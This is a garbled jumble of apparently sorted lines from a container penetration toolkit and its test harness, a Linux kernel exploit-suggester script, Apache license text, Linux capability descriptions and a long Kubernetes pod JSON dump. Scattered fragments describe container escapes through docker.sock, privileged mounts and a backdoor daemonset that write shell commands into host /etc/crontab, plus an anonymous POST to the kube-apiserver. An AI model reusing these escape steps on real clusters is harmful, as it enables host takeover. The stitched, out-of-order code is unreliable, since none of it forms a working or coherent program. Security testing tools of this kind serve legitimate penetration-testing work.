"    IFS=',' read -r -a array <<< ""$REQS"""
"    KERNEL=$(echo ""$uname"" "
"    KERNEL_ALL=$(echo ""$uname"" "
"    NAME=""${NAME:9}"""
"    NAME=""${arr[0]}"" "
"    NAME=""${arr[0]}"""
"    OS="""""
"    PRE_NAME=""${NAME:0:8}"""
"    RANK=""${arr[3]}"" "
"    REQS=""${arr[1]}"" "
"    TAGS=""${arr[2]}"" "
"    [ ! -e ""$CVELIST_FILE"" ] "
"    [ ""$opt_kernel_version"" = ""true"" ] "
"    [ ""$opt_pkglist_file"" = ""true"" ] "
"    [ ""$opt_skip_more_checks"" = ""false"" ] "
"    [ ""$opt_uname_string"" = ""true"" ] "
"    [ -n ""$analysis_url"" ] "
"    [ -z ""$KCONFIG"" ] "
"    [ -z ""$KERNEL"" ] "
"    [ -z ""$UNAME_A"" ] "
"    ],"
"    analysis_url=$(echo ""$FEATURE"" "
"    args: [""-c"", ""apt update "
"    case ""$1"" in"
"    check_host_evaluate('evaluate --full', white_list, black_list)"
"    check_host_exec('ls /tmp/docker-api-pwn', ['docker-api-pwn'], [], False)"
"    check_host_exec('ls /tmp/docker-sock-pwn', ['docker-sock-pwn'], [], False)"
"    check_host_exec('rm /tmp/mount-cgroup-success', [], ['No such file or directory'], False)"
"    check_host_exec('rm /tmp/mount-procfs-success', [], ['No such file or directory'], False)"
"    check_host_exec('rm /tmp/shim-pwn-success', [], ['No such file or directory'], False)"
"    check_host_exec(r'/root/cdk-fabric dcurl get http://127.0.0.1:2375/info """"', ['ContainersRunning'], [], False)"
"    check_host_exec(r'cat /etc/crontab', ['CDK auto exploit via docker.sock'], [], False)"
"    check_host_exec(r'cat /etc/crontab', ['CDK auto exploit via mounted device in privileged container'], [], False)"
"    check_host_exec(r'cp -f /etc/crontab_bak /etc/crontab', [], ['cp'], False)"
"    check_host_exec(r'echo ""AKIA99999999999999AB"" > /tmp/ak-leakage', [], [], False)"
"    check_host_exec(r'ls /tmp/auto-priv-cgroup', ['/tmp/auto-priv-cgroup'], [], False)"
"    check_host_exec(r'ls /tmp/auto-shimpwn', ['/tmp/auto-shimpwn'], [], False)"
"    check_host_exec(r'rm /tmp/ak-leakage', [], [], False)"
"    check_host_exec(r'rm /tmp/auto-priv-cgroup', [], [], False)"
"    check_host_exec(r'rm /tmp/auto-shimpwn', [], [], False)"
"    check_host_exec(r'rm /tmp/docker-api-pwn', [], [], False)"
"    check_host_exec(r'rm /tmp/docker-sock-pwn', [], [], False)"
"    check_pod_exec('evaluate', white_list, ['i@cdxy.me', 'input args'], False)"
"    cmd = r'kubectl cp {} {}:{}'.format(SELFBUILD_K8S.REMOTE_HOST_PATH, SELFBUILD_K8S.TARGET_POD,"
"    cmd = r'{} --kubeconfig={} cp {} {}:{}'.format(DEV_PATH.KUBECTL_PATH, K8S.KUBE_CONFIG, CDK.BIN_PATH, K8S.TARGET_POD,"
"    cmd1 = r'kubectl exec {} ls {}'.format(SELFBUILD_K8S.TARGET_POD, SELFBUILD_K8S.REMOTE_POD_PATH)"
"    cmd1 = r'{} --kubeconfig={} exec {} -- ls {}'.format(DEV_PATH.KUBECTL_PATH, K8S.KUBE_CONFIG, K8S.TARGET_POD,"
"    cmd_parsed = ""docker run -v {}:{} --rm {} {} /bin/sh -c "
"    cmd_parsed = ""{} {}"".format(CDK.REMOTE_HOST_PATH, cmd)"
"    cmd_parsed = r'{} --kubeconfig={} exec {} -- {} {}'.format(DEV_PATH.KUBECTL_PATH, K8S.KUBE_CONFIG, K8S.TARGET_POD,"
"    command: [""/bin/sh"", ""-c"", ""sleep 1""]"
"    command: [""/bin/sh""]"
"    done <<< ""$EXP"""
"    done <<< ""$FEATURE"""
"    echo "" --checksec                   - list security related features for your HW/kernel"""
"    echo "" --cvelist-file <file>        - provide file with Linux kernel CVEs list"""
"    echo "" --kernelspace-only           - show only kernel vulnerabilities"""
"    echo "" --skip-more-checks           - do not perform additional checks (kernel config, sysctl) to determine if exploit is applicable"""
"    echo "" --skip-pkg-versions          - skip checking for exact userspace package version (helps to avoid false negatives)"""
"    echo "" --userspace-only             - show only userspace vulnerabilities"""
"    echo "" -V "
"    echo "" -b "
"    echo "" -d "
"    echo "" -f "
"    echo "" -g "
"    echo "" -h "
"    echo "" -k "
"    echo "" -p "
"    echo "" -s "
"    echo "" -u "
"    echo ""$1"" 1>"
"    echo ""$uname"" "
"    echo ""LES ver. $VERSION (https://github.com/mzet-/linux-exploit-suggester) by @_mzet_"""
"    echo ""Usage: linux-exploit-suggester.sh [OPTIONS]"""
"    echo ""linux-exploit-suggester ""$VERSION"", mzet, https://z-labs.eu, March 2019"""
"    echo -e "" $state $feature ${wht}${CONFIG}${txtrst}"""
"    elif [ ""$RANK"" -ge 3 ]"
"    elif [ ""$distro"" = ""RHEL"" -o ""$distro"" = ""fedora"" -o ""$distro"" = ""mageia"" ]"
"    elif [ ""$distro"" = ""arch"" -o ""$distro"" = ""manjaro"" ]"
"    elif [ ""$distro"" = ""debian"" -o ""$distro"" = ""ubuntu"" -o ""$distro"" = ""deepin"" ]"
"    elif [ ""$reqRelation"" == ""<"" ]"
"    elif [ ""$reqRelation"" == ""<="" ]"
"    elif [ ""$reqRelation"" == "">"" ]"
"    elif [ ""$reqRelation"" == "">="" ]"
"    elif [ ""$sign"" == ""!="" ]"
"    elif [ -f ""${KBUILD_OUTPUT:-/usr/src/linux}""/.config ] "
"    elif [[ ""$IN"" ="
"    exitWithErrMsg ""Script needs Bash in version 4.0 or newer. Aborting."""
"    feature=$(echo ""$FEATURE"" "
"    file  = ""/proc/net/route"""
"    file, err := os.Open(file)"
"    for REQ in ""${array[@]}"""
"    getPkgList """" ""$PKGLIST_FILE"""
"    if [ ""$RANK"" -ge 6 ]"
"    if [ ""$opt_pkglist_file"" = ""true"" -a -e ""$pkglist_file"" ]"
"    if [ ""$opt_pkglist_file"" == ""false"" ]"
"    if [ ""$reqRelation"" == ""="" ]"
"    if [ ""$sign"" == ""=="" ]"
"    if [ ""${PRE_NAME}"" = ""section:"" ]"
"    if [ -n ""$ENABLE"" ]"
"    if [ -n ""$cmdStdout"" ]"
"    if [[ ""$IN"" ="
"    image: ""alpine"""
"    k8s_master_ssh_cmd(cmd, [], [], True)"
"    k8s_master_ssh_cmd(cmd_parsed, white_list, black_list, verbose)"
"    local IN=""$1"""
"    local currentVersion=""$3"""
"    local pkgName=""${2:4}"""
"    local reqRelation=""$2"""
"    local reqVersion=""$1"""
"    msg = ""Ran {0.command!r} on {0.connection.host}, got stdout:"
"    parseUname ""$UNAME_A"""
"    pkgListFile=""${txtgrn}$PKGLIST_FILE${txtrst}"""
"    pkgListFile=""${txtgrn}from current OS${txtrst}"""
"    pkgListFile=""${txtred}unrecognized file provided${txtrst}"""
"    print(""check cdk banner in .go"")"
"    print(""check cdk banner in github wiki"")"
"    print(""check cdk banner in readme.md"")"
"    print(""check cdk version"")"
"    print('[Local]', CDK.BUILD_CMD)"
"    print('[TEST] [{}] {}'.format('ECS', cmd_parsed))"
"    print('[TEST] [{}] {}'.format('K8s Pod', cmd_parsed))"
"    print('[TEST] [{}] {}'.format('Selfbuild k8s master node', cmd_parsed))"
"    print('[TEST] [{}] {}'.format(image, cmd_parsed))"
"    resp = k8s_master_ssh_cmd(cmd1, [], [], False)"
"    result = conn.run(""uname -s"", hide=True)"
"    ret = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)"
"    ret = subprocess.Popen(cmd_parsed, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,"
"    ret1 = subprocess.Popen(cmd1, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)"
"    return Connection(SELFBUILD_K8S.HOST, SELFBUILD_K8S.USER, connect_kwargs=connect_kwargs)"
"    return Connection(SERVER.HOST, SERVER.USER, connect_kwargs=connect_kwargs)"
"    sep   = """
"    },"
"   ""path"": ""/tmp"""
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
"   8. Limitation of Liability. In no event and under no legal theory,"
"   An LSM may enforce a MAC policy, and if it does and it chooses"
"   Licensed under the Apache License, Version 2.0 (the ""License"")"
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
"   Transfer any capability in your permitted set to any pid,"
"   Unless required by applicable law or agreed to in writing, software"
"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"   and directories, including ACL restrictions if [_POSIX_ACL] is"
"   distributed under the License is distributed on an ""AS IS"" BASIS,"
"   file owner ID must be equal to the user ID, except where CAP_FSETID"
"   policy or the data required to maintain it, this is the"
"   to implement capability based overrides of that policy, this is"
"  ""hooks"": {"
"  ""hostname"": ""b6cee9b57f3b"","
"  ""linux"": {"
"  ""ociVersion"": ""1.0.1-dev"","
"  ""process"": {"
"  ""root"": {"
"  ./cdk kcurl anonymous post 'https://192.168.0.234:6443/api/v1/nodes' '{""apiVersion"":""v1"",...}'"
"  <img src=""https://contrib.rocks/image"
"  In the case of gid_map, use of the setgroups(2) system"
"  apiGroup: ""rbac.authorization.k8s.io"""
"  cdk eva                                   Alias of ""cdk evaluate""."
"  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki"
"  netstat                                   Like ""netstat -antup"" command."
"  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000"
"  ps                                        Show process information like ""ps -ef"" command."
"  schedule: """
"  vi <file>                                 Edit files in container like ""vi"" command."
"  },"
" !bytes.Contains(out, []byte(tt.successStr)) {"
" !strings.Contains(fstring, ""runc-pwn"") {"
" !strings.Contains(resp, "
" !strings.Contains(resp, ""items"") {"
" !strings.Contains(resp, ""kube-apiserver"") {"
" "" needs to escape in raw"
" ""-"" "
" ""-shadow"" "
" ""."" "
" ""/"" "
" ""/cmdline"")"
" ""/containers/"" "
" ""/containers/create"""
" ""/etc/crontab"""
" ""/images/create"
" ""/info"""
" ""/merged"""
" ""/start"""
" ""/sys/kernel/core_pattern"""
" $src_url"""
" --fetch-binaries        - automatically downloads binary for matched exploit if available"""
" --fetch-sources         - automatically downloads source for matched exploit"""
" --full                  - show full info about matched exploit"""
" --help                  - print this help"""
" --kernel <version>      - provide kernel version"""
" --pkglist-file <file>   - provide file with 'dpkg -l' or 'rpm -qa' command output"""
" --short                 - show shorten info about matched exploit"""
" --show-dos              - show also DoSes in results"""
" --uname <string>        - provide 'uname -a' string"""
" --version               - print version of this script"""
" -n ""$EXPLOIT_DB"" ]]"
" /var/log mount."")"
" 10, 'build CDK binary', '-' "
" 10, 'upload CDK to ECS, ACK, Selfbuild-K8s', '-' "
" 10, 'upload all done', '-' "
" 1024,"
" 20,"
" @args is ips: %v, max parallels:%v, timeout:%v"
" AVAILABLE=""${AVAILABLE:11}"""
" Allow administration of IP firewall, masquerading and accounting "
" Allow administration of apm_bios, serial and bttv (TV) device "
" Allow administration of md devices (mostly the above, but some"
" Allow broadcasting, listen to multicast "
" Allow mount() and umount(), setting up new smb connection "
" BlueBold.Sprint(""  ]"
" CDK auto exploit via K8s backdoor daemonset"", ""/host-root/etc/crontab"", shellCommand)"
" CDK auto exploit via docker.sock"")"
" CDK auto exploit via mounted device in privileged container"", crontabDir, shellCommand)"
" CGO_CFLAGS=""-Wno-undef-prefix=TARGET_OS_ -Wno-deprecated-declarations"""
" CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {} build cdk.go'.format(BUILD_PATH, DEV_PATH.GO_BINARY)"
" CONFIG=""($(echo $REQ "
" Code written by neargle on 2021-02-08, last commit id 9d3a39a5f1e45827b008fff1ee9cf3cac3409665."
" Copyright (c) 2016-2020, @_mzet_"
" Describe the current CDK version, environment, problem and exact steps that reproduce the problem."
" If you are committing a new evaluate/exploit scripts, please add a simple doc to your PR message, here is an [example](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-deploy)."
" In a system with the [_POSIX_CHOWN_RESTRICTED] option defined, this"
" NAME=""${NAME:6}"""
" NOTE: ext2 honors fsuid when checking for resource overrides, so"
" OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused ""text file busy"""
" OS=""RHEL"""
" OS=""arch"""
" OS=""debian"""
" OS=""deepin"""
" OS=""fedora"""
" OS=""mageia"""
" OS=""manjaro"""
" OS=""ubuntu"""
" Override all DAC access, including ACL execute access if"
" Overrides all restrictions about allowed operations on files, where"
" RANK=""${RANK:6}"""
" REQS=""${REQS:6}"""
" TAG=""${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{kernel:$tag_pkg_num}"""
" TAG=""${lightyellow}[ ${TAG} ]${txtrst}"""
" TAGS=""${TAGS:6}"""
" This is free software, and you are welcome to redistribute it"
" Used instead of CAP_CHOWN to ""chown"" IPC message queues, semaphores"
" With VFS support for capabilities (neither of above, but)"
" [ ""$ARCH"" == ""i386"" -o ""$ARCH"" == ""i686"" -o ""$ARCH"" == """" ]"
" [ ""$ARCH"" == ""x86_64"" -o ""$ARCH"" == """" ]"
" [ $opt_summary = ""true"" ] "
" [ $opt_uname_string = ""true"" ] "
" [ -n ""$EXPLOIT_DB"" ] "
" [ -n ""$dos"" ] "
" [ -z ""$bin_url"" ] "
" awk '{print $1""-""$2}')"
" awk '{print $1"":""$2}')"
" awk '{print $2""-""$3}' "
" awk -F ""$sign"" '{print $1}')"
" awk -F ""$sign"" '{print $2}')"
" check if it's on CVELIST_FILE list, if no move to next exploit"
" check_host_exec(r'cp -f /etc/crontab_bak /etc/crontab', [], ['cp'], False)"
" ci.CgroupPath != ""0::/"" {"
" command on target os"")"
" commands to control docker API"")"
" cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf""],""resources"":{},""volumeMounts"":[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""readOnlyRootFilesystem"":true}}],""containers"":[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr""],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""100m"",""memory"":""256Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""run"",""mountPath"":""/run""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN""]},""privileged"":false,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/arch"":""amd64"",""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""flannel"",""serviceAccount"":""flannel"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.150""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:43Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:49Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:49Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-04-08T04:12:29Z"",""initContainerStatuses"":[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-09-10T07:23:39Z"",""finishedAt"":""2020-09-10T07:23:39Z"",""containerID"":""docker://d9ca116d797c8be92c930e377510af17bab00d32aef59c6592cf610b1fc965eb""}},""lastState"":{},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://d9ca116d797c8be92c930e377510af17bab00d32aef59c6592cf610b1fc965eb""}],""containerStatuses"":[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:41Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:43Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://e75d968cc7b54f61e5f5703ab81bd55699c314c17fa3c7c7048a5c99177d6946""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://6e8f580e56d50ab4315db999ce2434dad545e3d652d97a83c808c62bd7dbf75f"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-flannel-ds-9xgjv"",""generateName"":""kube-flannel-ds-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-9xgjv"",""uid"":""42c625ba-2454-45b2-9ab4-e658bf9ee760"",""resourceVersion"":""1923"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""app"":""flannel"",""controller-revision-hash"":""5d9fd8ccf4"",""pod-template-generation"":""1"",""tier"":""node""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""run"",""hostPath"":{""path"":""/run"",""type"":""""}},{""name"":""cni"",""hostPath"":{""path"":""/etc/cni/net.d"",""type"":""""}},{""name"":""flannel-cfg"",""configMap"":{""name"":""kube-flannel-cfg"",""defaultMode"":420}},{""name"":""flannel-token-pblrl"",""secret"":{""secretName"":""flannel-token-pblrl"",""defaultMode"":420}}],""initContainers"":[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x"
" cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf""],""resources"":{},""volumeMounts"":[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""readOnlyRootFilesystem"":true}}],""containers"":[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr""],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""100m"",""memory"":""256Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""run"",""mountPath"":""/run""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN""]},""privileged"":false,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/arch"":""amd64"",""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""flannel"",""serviceAccount"":""flannel"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.151""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:42Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:52Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:52Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:12:29Z"",""initContainerStatuses"":[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:41Z"",""finishedAt"":""2020-04-08T04:12:41Z"",""containerID"":""docker://a2fe681655f7e79a0c7ee942e9a56f9d45d72e5b16631625fd06d14750c3a79e""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://a2fe681655f7e79a0c7ee942e9a56f9d45d72e5b16631625fd06d14750c3a79e""}],""containerStatuses"":[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:42Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://fd4ad685db257927caacea7a42cb0745b2d19b16f1e18a47d174263a3da2fe59"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-flannel-ds-fsjhn"",""generateName"":""kube-flannel-ds-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-fsjhn"",""uid"":""05b56fcd-04ed-4795-a38c-faf97862045c"",""resourceVersion"":""1800"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""app"":""flannel"",""controller-revision-hash"":""5d9fd8ccf4"",""pod-template-generation"":""1"",""tier"":""node""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""run"",""hostPath"":{""path"":""/run"",""type"":""""}},{""name"":""cni"",""hostPath"":{""path"":""/etc/cni/net.d"",""type"":""""}},{""name"":""flannel-cfg"",""configMap"":{""name"":""kube-flannel-cfg"",""defaultMode"":420}},{""name"":""flannel-token-pblrl"",""secret"":{""secretName"":""flannel-token-pblrl"",""defaultMode"":420}}],""initContainers"":[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x"
" cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf""],""resources"":{},""volumeMounts"":[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""readOnlyRootFilesystem"":true}}],""containers"":[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr""],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""100m"",""memory"":""256Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""run"",""mountPath"":""/run""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l 